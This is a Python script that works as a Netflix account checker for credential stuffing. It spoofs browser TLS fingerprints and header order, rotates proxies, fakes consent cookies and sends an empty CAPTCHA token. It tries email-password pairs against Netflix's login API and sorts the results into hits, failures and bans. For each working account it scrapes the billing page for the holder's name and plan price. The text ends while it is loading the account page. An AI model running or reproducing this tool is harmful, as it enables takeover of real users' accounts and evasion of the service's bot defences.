import uuid
import random
import re
import json
import datetime
import collections
import pytz
import ssl
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.ssl_ import create_urllib3_context

try:
    import tls_client
    HAS_TLS_CLIENT = True
except ImportError:
    HAS_TLS_CLIENT = False

CIPHERS = ":".join([
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-ECDSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-CHACHA20-POLY1305",
    "ECDHE-RSA-CHACHA20-POLY1305",
    "ECDHE-RSA-AES128-SHA",
    "ECDHE-RSA-AES256-SHA",
    "AES128-GCM-SHA256",
    "AES256-GCM-SHA384",
    "AES128-SHA",
    "AES256-SHA",
])

class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        ctx = create_urllib3_context(ciphers=CIPHERS)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.set_alpn_protocols(["h2", "http/1.1"])
        kwargs["ssl_context"] = ctx
        return super().init_poolmanager(*args, **kwargs)

TLS_PROFILES = [
    {
        "name": "Chrome 133 (Windows)",
        "identifier": "chrome_133",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="133", "Google Chrome";v="133", "Not(A:Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9",
        "accept_encoding": "gzip, deflate, br, zstd",
        "header_order": [
            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
            "upgrade-insecure-requests", "user-agent", "accept",
            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
            "cookie", "priority",
        ],
    },
    {
        "name": "Chrome 130 (Windows)",
        "identifier": "chrome_130",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9",
        "accept_encoding": "gzip, deflate, br, zstd",
        "header_order": [
            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
            "upgrade-insecure-requests", "user-agent", "accept",
            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
            "cookie",
        ],
    },
    {
        "name": "Chrome 124 (macOS)",
        "identifier": "chrome_124",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "sec_ch_ua": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
        "sec_ch_ua_platform": '"macOS"',
        "sec_ch_ua_mobile": "?0",
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9",
        "accept_encoding": "gzip, deflate, br, zstd",
        "header_order": [
            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
            "upgrade-insecure-requests", "user-agent", "accept",
            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
            "cookie",
        ],
    },
    {
        "name": "Safari 18 (iOS 18)",
        "identifier": "safari_ios_18_0",
        "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.3 Mobile/15E148 Safari/604.1",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept_api": "*/*",
        "accept_lang": "en-GB,en;q=0.9",
        "accept_encoding": "gzip, deflate, br",
        "header_order": [
            "host", "sec-fetch-dest", "user-agent", "accept",
            "referer", "sec-fetch-site", "sec-fetch-mode",
            "accept-language", "priority", "accept-encoding", "cookie",
        ],
    },
    {
        "name": "Safari 17.5 (macOS)",
        "identifier": "safari_15_6_1",
        "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9",
        "accept_encoding": "gzip, deflate, br",
        "header_order": [
            "host", "accept", "sec-fetch-site", "sec-fetch-dest",
            "accept-language", "sec-fetch-mode", "user-agent",
            "referer", "accept-encoding", "cookie",
        ],
    },
    {
        "name": "Firefox 133 (Windows)",
        "identifier": "firefox_120",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
        "sec_ch_ua": None,
        "sec_ch_ua_platform": None,
        "sec_ch_ua_mobile": None,
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.5",
        "accept_encoding": "gzip, deflate, br, zstd",
        "header_order": [
            "host", "user-agent", "accept", "accept-language",
            "accept-encoding", "referer", "connection",
            "upgrade-insecure-requests", "sec-fetch-dest",
            "sec-fetch-mode", "sec-fetch-site", "sec-fetch-user",
            "priority", "cookie",
        ],
    },
    {
        "name": "Edge 131 (Windows)",
        "identifier": "chrome_131",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0",
        "sec_ch_ua": '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        "sec_ch_ua_platform": '"Windows"',
        "sec_ch_ua_mobile": "?0",
        "accept_nav": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept_api": "*/*",
        "accept_lang": "en-US,en;q=0.9",
        "accept_encoding": "gzip, deflate, br, zstd",
        "header_order": [
            "host", "sec-ch-ua", "sec-ch-ua-mobile", "sec-ch-ua-platform",
            "upgrade-insecure-requests", "user-agent", "accept",
            "sec-fetch-site", "sec-fetch-mode", "sec-fetch-user",
            "sec-fetch-dest", "referer", "accept-encoding", "accept-language",
            "cookie",
        ],
    },
]


def pick_profile():
    return random.choice(TLS_PROFILES)


def create_session(profile):
    if HAS_TLS_CLIENT:
        session = tls_client.Session(
            client_identifier=profile["identifier"],
            random_tls_extension_order=True,
            header_order=profile["header_order"],
        )
        session.timeout_seconds = 30
        return session
    else:
        session = requests.Session()
        session.mount("https://", TLSAdapter())
        session.headers.update({"User-Agent": profile["user_agent"]})
        return session

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()

    from urllib.parse import urlparse, quote

    if "://" in proxy_str:
        parsed = urlparse(proxy_str)
        scheme = parsed.scheme or "http"
        host = parsed.hostname
        port = parsed.port
        user = parsed.username
        passwd = parsed.password
        if not host or not port:
            return None
        if user and passwd:
            return f"{scheme}://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        elif user:
            return f"{scheme}://{quote(user, safe='')}@{host}:{port}"
        return f"{scheme}://{host}:{port}"

    if "@" in proxy_str:
        auth_part, host_part = proxy_str.rsplit("@", 1)
        if ":" in host_part:
            host, port = host_part.rsplit(":", 1)
        else:
            return None
        if ":" in auth_part:
            user, passwd = auth_part.split(":", 1)
            return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
        return f"http://{quote(auth_part, safe='')}@{host}:{port}"

    parts = proxy_str.split(":")
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        host, port, user, passwd = parts[0], parts[1], parts[2], parts[3]
        return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
    elif len(parts) >= 5:
        host = parts[0]
        port = parts[1]
        user = parts[2]
        passwd = ":".join(parts[3:])
        return f"http://{quote(user, safe='')}:{quote(passwd, safe='')}@{host}:{port}"
    elif len(parts) == 3:
        host, port, user = parts[0], parts[1], parts[2]
        return f"http://{quote(user, safe='')}@{host}:{port}"
    return None

TIMEZONES = [
    ("Asia/Dhaka",    "+0600", "Bangladesh Standard Time"),
    ("Asia/Kolkata",  "+0530", "India Standard Time"),
    ("Europe/London", "+0100", "British Summer Time"),
    ("America/Chicago", "-0500", "Central Daylight Time"),
    ("America/New_York", "-0400", "Eastern Daylight Time"),
    ("Europe/Berlin", "+0200", "Central European Summer Time"),
    ("Australia/Sydney", "+1100", "Australian Eastern Daylight Time"),
]

COUNTRY_CODE_SMALL = {
    "AF":"af","AL":"al","DZ":"dz","AS":"as","AD":"ad","AO":"ao","AI":"ai","AQ":"aq",
    "AG":"ag","AR":"ar","AM":"am","AW":"aw","AU":"au","AT":"at","AZ":"az","BS":"bs",
    "BH":"bh","BD":"bd","BB":"bb","BY":"by","BE":"be","BZ":"bz","BJ":"bj","BM":"bm",
    "BT":"bt","BO":"bo","BA":"ba","BW":"bw","BV":"bv","BR":"br","IO":"io","BN":"bn",
    "BG":"bg","BF":"bf","BI":"bi","KH":"kh","CM":"cm","CA":"ca","CV":"cv","KY":"ky",
    "CF":"cf","TD":"td","CL":"cl","CN":"cn","CX":"cx","CC":"cc","CO":"co","KM":"km",
    "CG":"cg","CK":"ck","CR":"cr","CI":"ci","HR":"hr","CU":"cu","CY":"cy","CZ":"cz",
    "DK":"dk","DJ":"dj","DM":"dm","DO":"do","EC":"ec","EG":"eg","SV":"sv","GQ":"gq",
    "ER":"er","EE":"ee","ET":"et","FK":"fk","FO":"fo","FJ":"fj","FI":"fi","FR":"fr",
    "GF":"gf","PF":"pf","TF":"tf","GA":"ga","GM":"gm","GE":"ge","DE":"de","GH":"gh",
    "GI":"gi","GR":"gr","GL":"gl","GD":"gd","GP":"gp","GU":"gu","GT":"gt","GN":"gn",
    "GW":"gw","GY":"gy","HT":"ht","HM":"hm","HN":"hn","HK":"hk","HU":"hu","IS":"is",
    "IN":"in","ID":"id","IR":"ir","IQ":"iq","IE":"ie","IL":"il","IT":"it","JM":"jm",
    "JP":"jp","JO":"jo","KZ":"kz","KE":"ke","KI":"ki","KR":"kr","KP":"kp","KW":"kw",
    "KG":"kg","LA":"la","LV":"lv","LB":"lb","LS":"ls","LR":"lr","LY":"ly","LI":"li",
    "LT":"lt","LU":"lu","MO":"mo","MK":"mk","MG":"mg","MW":"mw","MY":"my","MV":"mv",
    "ML":"ml","MT":"mt","MH":"mh","MQ":"mq","MR":"mr","MU":"mu","YT":"yt","MX":"mx",
    "FM":"fm","MD":"md","MC":"mc","MN":"mn","ME":"me","MS":"ms","MA":"ma","MZ":"mz",
    "MM":"mm","NA":"na","NR":"nr","NP":"np","NL":"nl","AN":"an","NC":"nc","NZ":"nz",
    "NI":"ni","NE":"ne","NG":"ng","NU":"nu","NF":"nf","MP":"mp","NO":"no","OM":"om",
    "PK":"pk","PW":"pw","PS":"ps","PA":"pa","PG":"pg","PY":"py","PE":"pe","PH":"ph",
    "PN":"pn","PL":"pl","PT":"pt","PR":"pr","QA":"qa","RE":"re","RO":"ro","RU":"ru",
    "RW":"rw","SH":"sh","KN":"kn","LC":"lc","PM":"pm","VC":"vc","WS":"ws","SM":"sm",
    "ST":"st","SA":"sa","SN":"sn","RS":"rs","SC":"sc","SL":"sl","SG":"sg","SK":"sk",
    "SI":"si","SB":"sb","SO":"so","ZA":"za","GS":"gs","ES":"es","LK":"lk","SD":"sd",
    "SR":"sr","SJ":"sj","SZ":"sz","SE":"se","CH":"ch","SY":"sy","TW":"tw","TJ":"tj",
    "TZ":"tz","TH":"th","TL":"tl","TG":"tg","TK":"tk","TO":"to","TT":"tt","TN":"tn",
    "TR":"tr","TM":"tm","TC":"tc","TV":"tv","UG":"ug","UA":"ua","AE":"ae","GB":"gb",
    "US":"us","UM":"um","UY":"uy","UZ":"uz","VU":"vu","VE":"ve","VN":"vn","VG":"vg",
    "VI":"vi","WF":"wf","EH":"eh","YE":"ye","ZM":"zm","ZW":"zw",
}

COUNTRY_PHONE = {
    "AF":"93","AL":"355","DZ":"213","AS":"1684","AD":"376","AO":"244","AI":"1264",
    "AQ":"N/A","AG":"1268","AR":"54","AM":"374","AW":"297","AU":"61","AT":"43",
    "AZ":"994","BS":"1242","BH":"973","BD":"880","BB":"1246","BY":"375","BE":"32",
    "BZ":"501","BJ":"229","BM":"1441","BT":"975","BO":"591","BA":"387","BW":"267",
    "BV":"N/A","BR":"55","IO":"246","BN":"673","BG":"359","BF":"226","BI":"257",
    "KH":"855","CM":"237","CA":"1","CV":"238","KY":"1345","CF":"236","TD":"235",
    "CL":"56","CN":"86","CX":"61","CC":"61","CO":"57","KM":"269","CG":"242",
    "CK":"682","CR":"506","CI":"225","HR":"385","CU":"53","CY":"357","CZ":"420",
    "DK":"45","DJ":"253","DM":"1767","DO":"1809","EC":"593","EG":"20","SV":"503",
    "GQ":"240","ER":"291","EE":"372","ET":"251","FK":"500","FO":"298","FJ":"679",
    "FI":"358","FR":"33","GF":"594","PF":"689","TF":"N/A","GA":"241","GM":"220",
    "GE":"995","DE":"49","GH":"233","GI":"350","GR":"30","GL":"299","GD":"1473",
    "GP":"590","GU":"1671","GT":"502","GN":"224","GW":"245","GY":"592","HT":"509",
    "HM":"N/A","HN":"504","HK":"852","HU":"36","IS":"354","IN":"91","ID":"62",
    "IR":"98","IQ":"964","IE":"353","IL":"972","IT":"39","JM":"1876","JP":"81",
    "JO":"962","KZ":"7","KE":"254","KI":"686","KR":"82","KP":"850","KW":"965",
    "KG":"996","LA":"856","LV":"371","LB":"961","LS":"266","LR":"231","LY":"218",
    "LI":"423","LT":"370","LU":"352","MO":"853","MK":"389","MG":"261","MW":"265",
    "MY":"60","MV":"960","ML":"223","MT":"356","MH":"692","MQ":"596","MR":"222",
    "MU":"230","YT":"262","MX":"52","FM":"691","MD":"373","MC":"377","MN":"976",
    "ME":"382","MS":"1664","MA":"212","MZ":"258","MM":"95","NA":"264","NR":"674",
    "NP":"977","NL":"31","AN":"599","NC":"687","NZ":"64","NI":"505","NE":"227",
    "NG":"234","NU":"683","NF":"672","MP":"1670","NO":"47","OM":"968","PK":"92",
    "PW":"680","PS":"970","PA":"507","PG":"675","PY":"595","PE":"51","PH":"63",
    "PN":"N/A","PL":"48","PT":"351","PR":"1787","QA":"974","RE":"262","RO":"40",
    "RU":"7","RW":"250","SH":"290","KN":"1869","LC":"1758","PM":"508","VC":"1784",
    "WS":"685","SM":"378","ST":"239","SA":"966","SN":"221","RS":"381","SC":"248",
    "SL":"232","SG":"65","SK":"421","SI":"386","SB":"677","SO":"252","ZA":"27",
    "GS":"N/A","ES":"34","LK":"94","SD":"249","SR":"597","SJ":"47","SZ":"268",
    "SE":"46","CH":"41","SY":"963","TW":"886","TJ":"992","TZ":"255","TH":"66",
    "TL":"670","TG":"228","TK":"690","TO":"676","TT":"1868","TN":"216","TR":"90",
    "TM":"993","TC":"1649","TV":"688","UG":"256","UA":"380","AE":"971","GB":"44",
    "US":"1","UM":"N/A","UY":"598","UZ":"998","VU":"678","VE":"58","VN":"84",
    "VG":"1284","VI":"1340","WF":"681","EH":"212","YE":"967","ZM":"260","ZW":"263",
}


def generate_cookie():
    tz_entry = random.choice(TIMEZONES)
    tz_name, offset_str, display_name = tz_entry
    now = datetime.datetime.now(pytz.timezone(tz_name))
    day   = now.strftime("%a")
    month = now.strftime("%b")
    date  = now.strftime("%d")
    year  = now.strftime("%Y")
    from urllib.parse import quote
    time_part = quote(now.strftime("%H:%M:%S"))
    sign  = "+" if now.utcoffset().total_seconds() >= 0 else "-"
    total_sec = int(abs(now.utcoffset().total_seconds()))
    h = total_sec // 3600
    m = (total_sec % 3600) // 60
    gmt_offset = "%s%02d%02d" % (sign, h, m)
    tz_display = display_name.replace(" ", "+")
    datestamp = "%s+%s+%s+%s+%s+GMT%%2B%s+(%s)" % (
        day, month, date, year, time_part, gmt_offset, tz_display
    )
    consent_id = str(uuid.uuid4())
    cookie = (
        "OptanonConsent=isGpcEnabled=0&datestamp=%s"
        "&version=202505.2.0&browserGpcFlag=0&isIABGlobal=false"
        "&hosts=&consentId=%s"
        "&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage"
        "&groups=C0001%%3A1%%2CC0002%%3A1%%2CC0003%%3A1%%2CC0004%%3A1"
        "&AwaitingReconsent=false"
    ) % (datestamp, consent_id)
    return cookie


def parse_lr(source, left, right):
    try:
        start = source.index(left) + len(left)
        end   = source.index(right, start)
        return source[start:end]
    except (ValueError, IndexError):
        return ""


def parse_regex(source, pattern, group=1):
    m = re.search(pattern, source)
    return m.group(group) if m else ""


def count_occurrences(text, word):
    return text.count(word)


def unescape_value(val):
    if not val:
        return val
    val = val.replace("\\x20", " ").replace("\\x28", "(").replace("\\x29", ")")
    val = val.replace("\\x2B", "+").replace("\\x24", "$")
    val = val.replace("\\u00A0", " ").replace("\\u200F", "").replace("\\u00A3", "£")
    try:
        val = val.encode("utf-8").decode("unicode_escape")
    except Exception:
        pass
    return val.strip()


def check_account(email, password, proxy=None):
    profile = pick_profile()
    session = create_session(profile)

    if proxy:
        proxy_url = parse_proxy(proxy)
        if proxy_url:
            session.proxies = {"http": proxy_url, "https": proxy_url}

    backend = "tls_client" if HAS_TLS_CLIENT else "requests"
    req_kwargs = {} if HAS_TLS_CLIENT else {"timeout": 30}

    optanon_cookie = generate_cookie()
    print(f"[*] Browser: {profile['name']} ({backend})")
    print(f"[*] Generated OptanonConsent cookie")

    login_headers = {
        "Host": "www.netflix.com",
        "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"],
        "Referer": "https://www.netflix.com/",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-User": "?1",
        "Accept-Language": profile["accept_lang"],
        "Accept-Encoding": profile["accept_encoding"],
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i",
        "Cookie": optanon_cookie,
    }
    if profile.get("sec_ch_ua"):
        login_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        login_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        login_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

    print("[*] Fetching Netflix login page...")
    r1 = session.get(
        "https://www.netflix.com/login",
        headers=login_headers,
        **req_kwargs,
    )

    if r1.status_code == 400:
        return {"status": "BAN", "message": "400 on login page"}
    if r1.status_code != 200:
        return {"status": "ERROR", "message": f"Unexpected status on login page: {r1.status_code}"}

    src = r1.text

    cookies = session.cookies.get_dict()
    flwssn          = cookies.get("flwssn", "")
    nfvdid          = cookies.get("nfvdid", "")
    secure_nfid     = cookies.get("SecureNetflixId", "")
    netflix_id      = cookies.get("NetflixId", "")
    gsid            = cookies.get("gsid", "")
    country         = parse_lr(src, '"country":"', '"')
    ui_version      = parse_lr(src, '"X-Netflix.uiVersion":"', '"')
    esn_prefix      = parse_lr(src, 'Netflix.esnPrefix":"', '"')
    request_id_raw  = r1.headers.get("X-Request-ID", "")
    request_id      = request_id_raw.replace("-", "")
    clcs_session_id = parse_lr(src, '"clcsSessionId\\":\\"', '\\"')
    referrer_rid    = parse_lr(src, '"referrerRenditionId\\":\\"', '\\"')
    uid             = str(uuid.uuid4())
    captcha_time    = random.randint(200, 950)

    country_small = COUNTRY_CODE_SMALL.get(country, country.lower())
    country_phone = COUNTRY_PHONE.get(country, "1")

    print(f"[*] Country: {country}, UI version: {ui_version}")
    print(f"[*] clcsSessionId: {clcs_session_id[:30]}..." if len(clcs_session_id) > 30 else f"[*] clcsSessionId: {clcs_session_id}")

    body = json.dumps({
        "operationName": "CLCSScreenUpdate",
        "variables": {
            "format": "HTML",
            "imageFormat": "PNG",
            "locale": f"en-{country}",
            "serverState": json.dumps({
                "realm": "growth",
                "name": "PASSWORD_LOGIN",
                "clcsSessionId": clcs_session_id,
                "sessionContext": {
                    "session-breadcrumbs": {"funnel_name": "loginWeb"},
                    "login.navigationSettings": {"hideOtpToggle": True}
                }
            }),
            "serverScreenUpdate": json.dumps({
                "realm": "custom",
                "name": "growthLoginByPassword",
                "metadata": {"recaptchaSiteKey": "6Lf8hrcUAAAAAIpQAFW2VFjtiYnThOjZOA5xvLyR"},
                "loggingAction": "Submitted",
                "loggingCommand": "SubmitCommand",
                "referrerRenditionId": referrer_rid,
            }),
            "inputFields": [
                {"name": "password",        "value": {"stringValue": password}},
                {"name": "userLoginId",     "value": {"stringValue": email}},
                {"name": "countryCode",     "value": {"stringValue": country_phone}},
                {"name": "countryIsoCode",  "value": {"stringValue": country}},
                {"name": "recaptchaResponseTime", "value": {"intValue": captcha_time}},
                {"name": "recaptchaResponseToken", "value": {"stringValue": ""}},
            ],
        },
        "extensions": {
            "persistedQuery": {
                "id": "99afa95c-aa4e-4a8a-aecd-19ed486822af",
                "version": 102
            }
        }
    })

    cookie_str = (
        f"netflix-mfa-nonce=Bgi_tOvcAxKVARY7wJ6HVp6Qmpy6b87rR0flzKeaPwB47PoOgAJvZCSosBbGAwB0ogxtFxjO0aIWP8CLO3Y3mtvYanTAieTfJz1junAgWKJ6XWI3Q0n9hJHkTnGaOMHgm-sZaIju7W5PXGK8t4xjH3zFSiP8muLi-qK64naQbfqnvbFThhDBm4o-O9R5XCgT7zY7RgbgZc4DE-atLiMmGAYiDgoMf3ZET0_YJ08hgk0s; "
        f"{optanon_cookie}; "
        f"flwssn={flwssn}; "
        f"netflix-sans-bold-3-loaded=true; netflix-sans-normal-3-loaded=true; "
        f"gsid={gsid}; "
        f"NetflixId={netflix_id}; "
        f"SecureNetflixId={secure_nfid}; "
        f"nfvdid={nfvdid}"
    )

    is_mobile = "iPhone" in profile["user_agent"] or "Mobile" in profile["user_agent"]
    form_factor = "phone" if is_mobile else "desktop"

    login_api_headers = {
        "Host": "web.prod.cloud.netflix.com",
        "Cookie": cookie_str,
        "X-Netflix.context.ui-Flavor": "akira",
        "Referer": "https://www.netflix.com/",
        "User-Agent": profile["user_agent"],
        "X-Netflix.context.is-Inapp-Browser": "false",
        "X-Netflix.request.client.context": '{"appstate":"foreground"}',
        "X-Netflix.context.operation-Name": "CLCSScreenUpdate",
        "Origin": "https://www.netflix.com",
        "Sec-Fetch-Dest": "empty",
        "X-Netflix.request.id": request_id,
        "Sec-Fetch-Site": "same-site",
        "X-Netflix.context.hawkins-Version": "5.12.1",
        "X-Netflix.context.form-Factor": form_factor,
        "X-Netflix.request.toplevel.uuid": uid,
        "X-Netflix.request.attempt": "1",
        "X-Netflix.request.clcs.bucket": "high",
        "Accept-Language": f"en-{country}",
        "X-Netflix.context.app-Version": ui_version,
        "Accept": profile["accept_api"],
        "Content-Type": "application/json",
        "Accept-Encoding": profile["accept_encoding"],
        "X-Netflix.context.locales": f"en-{country_small}",
        "X-Netflix.request.originating.url": (
            f"https://www.netflix.com/{country_small}/login"
            f"?serverState=%7B%22realm%22%3A%22growth%22%2C%22name%22%3A%22PASSWORD_LOGIN%22%7D"
        ),
    }
    if profile.get("sec_ch_ua"):
        login_api_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        login_api_headers["Sec-Fetch-Mode"] = "cors"

    max_retries = 3
    r2 = None
    login_session = create_session(profile)
    if proxy:
        proxy_url = parse_proxy(proxy)
        if proxy_url:
            login_session.proxies = {"http": proxy_url, "https": proxy_url}
    for attempt in range(max_retries):
        print(f"[*] Attempting login (attempt {attempt+1})...")
        r2 = login_session.post(
            "https://web.prod.cloud.netflix.com/graphql",
            headers=login_api_headers,
            data=body,
            **req_kwargs,
        )
        if r2.status_code != 500:
            break
        print("[!] Got 500, retrying...")

    if r2 is None:
        return {"status": "ERROR", "message": "Login request failed"}

    login_src = r2.text

    alert_msg = parse_regex(login_src, r'"alert-message-body".*?"text"\s*:\s*"([^"]+)"')
    if not alert_msg:
        alert_msg = parse_regex(login_src, r'"alertMessage".*?"text"\s*:\s*"([^"]+)"')
    if not alert_msg:
        alert_msg = parse_regex(login_src, r'"webTextWithTags".*?"text"\s*:\s*"([^"]+)"')

    if '"universal":"/browse"' in login_src:
        status = "HIT"
    elif "Incorrect password" in login_src or "incorrect password" in login_src.lower():
        return {"status": "FAIL", "message": "Incorrect password"}
    elif "too many" in login_src.lower() or "try again later" in login_src.lower():
        msg = unescape_value(alert_msg) if alert_msg else "Too many attempts"
        return {"status": "RATE_LIMITED", "message": msg}
    elif "captcha" in login_src.lower() or "recaptcha" in login_src.lower():
        msg = unescape_value(alert_msg) if alert_msg else "CAPTCHA required"
        return {"status": "CAPTCHA", "message": msg}
    elif 'universal":"/"},"' in login_src:
        status = "CUSTOM"
    elif "BAD_REQUEST" in login_src:
        return {"status": "BAN", "message": "BAD_REQUEST"}
    elif "CLCSScreenUpdateTransition" in login_src:
        if alert_msg:
            alert_clean = unescape_value(alert_msg)
            if "password" in alert_clean.lower():
                return {"status": "FAIL", "message": "Wrong password"}
            elif "locked" in alert_clean.lower() or "suspend" in alert_clean.lower():
                return {"status": "LOCKED", "message": alert_clean}
            else:
                status = "CUSTOM"
        else:
            inner_text = parse_regex(login_src, r'"text"\s*:\s*"([^"]{5,})"')
            msg = unescape_value(inner_text) if inner_text else "Transition screen with no clear message"
            return {"status": "UNKNOWN", "message": msg}
    else:
        msg = unescape_value(alert_msg) if alert_msg else f"Unknown response (status {r2.status_code})"
        return {"status": "UNKNOWN", "message": msg}

    login_cookies = login_session.cookies.get_dict()
    for name, value in login_cookies.items():
        session.cookies.set(name, value)

    updated = session.cookies.get_dict()
    netflix_id  = updated.get("NetflixId", netflix_id)
    secure_nfid = updated.get("SecureNetflixId", secure_nfid)
    nfvdid      = updated.get("nfvdid", nfvdid)
    flwssn      = updated.get("flwssn", flwssn)
    gsid        = updated.get("gsid", gsid)

    print(f"[*] Cookies merged ({len(updated)} total)")

    billing_headers = {
        "Host": "www.netflix.com",
        "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"],
        "Accept-Encoding": profile["accept_encoding"],
        "Accept-Language": profile["accept_lang"],
        "Connection": "keep-alive",
        "Referer": "https://www.netflix.com/browse",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
    }
    if profile.get("sec_ch_ua"):
        billing_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        billing_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        billing_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

    print("[*] Fetching billing page...")
    r3 = session.get("https://www.netflix.com/BillingActivity", headers=billing_headers, **req_kwargs)
    if r3.status_code != 200:
        print(f"[!] BillingActivity returned {r3.status_code}, retrying...")
        r3 = session.get("https://www.netflix.com/BillingActivity", headers=billing_headers, **req_kwargs)

    bill_src  = r3.text
    nfid = session.cookies.get_dict().get("NetflixId", netflix_id)

    name  = (
        parse_regex(bill_src, r'"userInfo"\s*:\s*\{\s*"data"\s*:\s*\{\s*"name"\s*:\s*"([^"]+)"') or
        parse_lr(bill_src, '"userInfo":{"data":{"name":"', '"')
    )
    pr = (
        parse_regex(bill_src, r'"priceFormatted"\s*:\s*"([^"]+)"') or
        parse_lr(bill_src, '{"__typename":"GrowthPrice","priceFormatted":"', '"')
    )

    account_headers = {
        "Host": "www.netflix.com",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": profile["user_agent"],
        "Accept": profile["accept_nav"],
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "Referer": "https://www.netflix.com/browse",
        "Accept-Language": profile["accept_lang"],
        "Accept-Encoding": profile["accept_encoding"],
    }
    if profile.get("sec_ch_ua"):
        account_headers["sec-ch-ua"] = profile["sec_ch_ua"]
        account_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
        account_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
        account_headers["sec-ch-ua-platform-version"] = '"15.0.0"'
        account_headers["sec-ch-ua-model"] = '""'

    print("[*] Fetching account page...")
    r4 = session.get("https://www.netflix.com/account/", headers=account_headers, **req_kwargs)
    if r4.status_code != 200:
        print(f"[!] Account page returned {r4.status_code}, retrying...")
